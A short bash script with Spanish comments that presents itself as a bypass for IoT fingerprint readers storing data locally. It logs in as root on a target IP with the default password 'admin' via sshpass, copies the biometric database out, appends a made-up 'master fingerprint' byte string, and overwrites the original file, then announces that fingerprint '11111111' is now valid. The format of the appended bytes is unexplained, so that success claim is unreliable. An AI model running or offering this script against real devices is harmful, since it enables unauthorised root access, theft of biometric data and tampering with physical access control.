#!/bin/bash
# Descripción: Emula huellas en lectores IoT con almacenamiento local
TARGET_IP=$1
FINGERPRINT_DB="/var/biometric_db.bin"

echo "[+] Copiando base de datos biométrica..."
sshpass -p "admin" scp root@$TARGET_IP:$FINGERPRINT_DB /tmp/backup.bin

echo "[+] Añadiendo huella maestra..."
echo -e "\x00\x00\x00\x01\x01\xFF\xFF\xFF" >> /tmp/backup.bin

echo "[!] Reemplazando archivo original..."
sshpass -p "admin" scp /tmp/backup.bin root@$TARGET_IP:$FINGERPRINT_DB

echo "[√] Bypass completado. Huella '11111111' ahora es válida."
